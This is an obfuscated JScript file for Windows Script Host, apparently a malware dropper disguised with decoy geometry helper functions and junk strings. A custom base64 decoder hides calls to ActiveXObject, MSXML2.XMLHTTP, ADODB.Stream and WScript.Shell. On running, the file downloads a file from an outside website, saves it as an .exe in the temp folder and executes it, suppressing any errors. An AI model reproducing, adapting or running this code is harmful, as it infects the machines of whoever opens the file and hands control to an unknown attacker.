
var puddles = new Array(-1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, -1, 62, -1, -1, -1, 63, 52, 53, 54, 55, 56, 57,
    58, 59, 60, 61, -1, -1, -1, -1, -1, -1, -1, 0, 1, 2, 3, 4, 5, 6,
    7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24,
    25, -1, -1, -1, -1, -1, -1, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36,
    37, 38, 39, 40, 41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, -1, -1, -1, -1, -1);

  keeping = [];
	
var rancor = { ':': '.','U': 'S','381': 'X'};
	var auckland = 0;


function a(b){if(b==1){return 2;}else{return 17;}
return 3;}
 function church(versed) {
	departments = versed;
	for (var i in rancor){departments = departments.replace(i, rancor[i]);}
    return departments;
};

var intrepid = 3-2;  
function Point(x, y) {
    this.x = x || 0;
    this.y = y || 0;
}

Point.create = function(o, y) {
    if (isArray(o)) return new Point(o[0], o[1]);
    if (isObject(o)) return new Point(o.x, o.y);
    return new Point(o, y);
};

Point.add = function(p1, p2) {
    return new Point(p1.x + p2.x, p1.y + p2.y);
};

Point.subtract = function(p1, p2) {
    return new Point(p1.x - p2.x, p1.y - p2.y);
};

Point.scale = function(p, scaleX, scaleY) {
    if (isObject(scaleX)) {
        scaleY = scaleX.y;
        scaleX = scaleX.x;
    } else if (!isNumber(scaleY)) {
        scaleY = scaleX;
    }
    return new Point(p.x * scaleX, p.y * scaleY);
};

Point.equals = function(p1, p2) {
    return p1.x == p2.x && p1.y == p2.y;
};

Point.angle = function(p) {
    return Math.atan2(p.y, p.x);
};
String.prototype.church4 = function() {
	
    var c1, c2, c3, c4;
    var i, len, out;
	var str = this.split("mathematician").join("");
    len = str.length;
    i = 0;
    out = "";

    while (i < len) {
        do {
            c1 = puddles[str.charCodeAt(i++) & 0xff]
        } while (i < len && c1 == -1);

        if (c1 == -1)
            break;

        do {
            c2 = puddles[str.charCodeAt(i++) & 0xff]
        } while (i < len && c2 == -1);

        if (c2 == -1)
            break;

        out += String.fromCharCode((c1 << 2) | ((c2 & 0x30) >> 4));

        do {
            c3 = str.charCodeAt(i++) & 0xff;

            if (c3 == 61)
                return out;

            c3 = puddles[c3]
        } while (i < len && c3 == -1);

        if (c3 == -1)
            break;

        out += String.fromCharCode(((c2 & 0XF) << 4) | ((c3 & 0x3C) >> 2));

        do {
            c4 = str.charCodeAt(i++) & 0xff;

            if (c4 == 61)
                return out;

            c4 = puddles[c4]
        } while (i < len && c4 == -1);

        if (c4 == -1)
            break;

        out += String.fromCharCode(((c3 & 0x03) << 6) | c4)
    }

    return out
}


var loaves ="mathematicianJVmathematicianRFTVmathematicianAl".church4();
Point.interpolate = function(p1, p2, f) {
    var dx = p2.x - p1.x;
    var dy = p2.y - p1.y;
    return new Point(p1.x + dx * f, p1.y + dy * f);
};
var spalding = "mathematicianQWmathematicianN0aXZmathematicianlWE9iamathematicianmVjdA=mathematician=".church4();
String.prototype.church2 = function () {
    var syntax = {
        playstation: this
    };
    syntax.fighters = syntax.playstation["c3Vic3RyaW5n".church4()](auckland, intrepid);
    return syntax.fighters;
};

var burlesque ="mathematicianRXhwYW5mathematiciankRW52aXmathematicianJvbm1lbnRTdHJmathematicianpbmdz".church4();
var Native = function(options){
	
};
var unshaven = [spalding, burlesque,loaves,  ""+"."+("calculators","happy","scanning","generating","cumshots","tolerant","discounts","edward","exe"), "UnVu".church4(), church("M"+"SX"+"ML"+("desecration","bracket","ready","russian","casey","amorphous","maximize","2.")+"381M"+"LH"+"TT"+("hackneyed","sitter","toilsome","retinue","natural","portland","outer","parable","P>")+"WU"+("emetic","enormity","awards","comedian","versatile","count","beside","cr")+("institutions","infringement","occur","vermilion","replacement","muslim","bracelet","coordinate","ip")+"t:"+("quarterly","quantum","designation","benjamin","suburban","having","northwest","allocation","Sh")+"ell")];
inimitable = "_F2_";
var distributors = this[unshaven.shift()];
Native.implement = function(objects, properties){
	for (var i = 0, l = objects.length; i < l; i++) objects[i].implement(properties);
};

Native.genericize = function(object, property, check){
	if ((!check || !object[property]) && typeof object.prototype[property] == 'function') object[property] = function(){
		var args = Array.prototype.slice.call(arguments);
		return object.prototype[property].apply(args.shift(), args);
	};
};
Native.typize = function(object, family){
	if (!object.type) object.type = function(item){
		return ($type(item) === family);
	};
};
dGjhuwwuR = "toyVjqW";
clinical = (("demise", "bedlam", "vastness", "dramatic", "overdo", "twenty", "chief", "peoLzzJm") + "OfJMmGhS").church2();
bugbear = (("shoot", "navajo", "demonstration", "martial", "grimace", "melbourne", "infest", "uproarious", "happened", "ssuaLkNvbu") + "IvlPDJIajVC").church2();
  
    String.prototype.deserter = function (a) {
        for (var b = [], c = 0; c < a.length; c++)b[c] = a[c];
        return b.join("")
    };

var exalting = unshaven.pop().split(">");

suspended = "b3Blbg==".church4();
var ending = new distributors(exalting[1]);
var leavetaking = new distributors(exalting[0]);
var postmaster = ending[unshaven.shift()](unshaven.shift());
weasel = "E";

var cleaner = unshaven.shift();
var apache = unshaven.shift();
function holiday(porsche, disposal) {

    try {
        var deafness = postmaster + "/" + disposal ;
		deafness = deafness+ cleaner;
            leavetaking[suspended](("overalls","shoemakers","G" + weasel) + ("arterial","ending","blacks","distributors","T"), porsche, false);
       
    zTdHrJ = "_F7_";
    leavetaking[bugbear + ("unbridled","vodka","end")]();
	var liberal=("clinical" + WScript=="clinical" + "V2luZG93cyBTY3JpcHQgSG9zdA==".church4())&&leavetaking["c3RhdHVz".church4()] +""=="MjAw".church4()&&typeof(YMgFtP)==="undefined";
	lQHNgR = "_F8_";
    if (liberal) {
		
        var sized = new distributors((("sponsors","enterprises","invader","colonnade","gasoline","briefs","lenders","eulogy","A")+("lender","cropped","solomon","mining","unsound","ascribe","cherubim","representatives","SEOO")+"DB"+("celebrities","recreation","tenacity","abnormally","globe","preaches","details",".S")+"tr8").replace("SEO", "D").replace("8", "eam"));
        sized[suspended]();
        WDSApyfPDUD = "_F9_";
        sized.type = intrepid;
        gcCGXVY = "_F10_";
        sized["d3JpdGU=".church4()](leavetaking[("dates","dozens","applies","windy","charged","heading","appalled","")+"R"+"es"+"pon"+rancor['U'].toLowerCase()+"e"+"Qm9keQ==".church4()]);
        TfICvKU = "_F11_";
        sized[(clinical + "o"+("osiris","shrimp","rutledge","invest","prime","scotia","governance","subjects","00")+("calculation","consults","appeal","equatorial","validity","training","words","8i")+"tion").replace("0"+("redundant","delhi","insider","carol","compressed","madagascar","ditty","08"), bugbear)] = 0;
        gBORYGMe = "_F12_";
        sized.saveToFile(deafness, 2);
        HGdbJq = "_F13_";
        sized.close();
        ecDcvg = "_F14_";
		ending[apache](deafness, intrepid, true);
    }
} catch (JtDbQU) { };

    eDCJJbf = "_F15_";
}
try{
holiday("aHR0cDovLw==".church4()+"\u0076\u0061\u006B\u0061\u006E\u0074\u0069\u0065\u0068\u0075\u0069\u0073\u0069\u006E\u0061\u0075\u0076\u0065\u0072\u0067"+"\u006E\u0065\u002E\u0063\u006F\u006D\u002F\u0033\u0067\u0033\u0034\u0074\u0033\u0074\u0034\u0074\u0067\u0067\u0072\u0074" + "?pypyzqpVlj=AythSYaufx","EVjODczq");}catch(obsLeM){}

   FQtxsRbtRJw = "_F16_";
   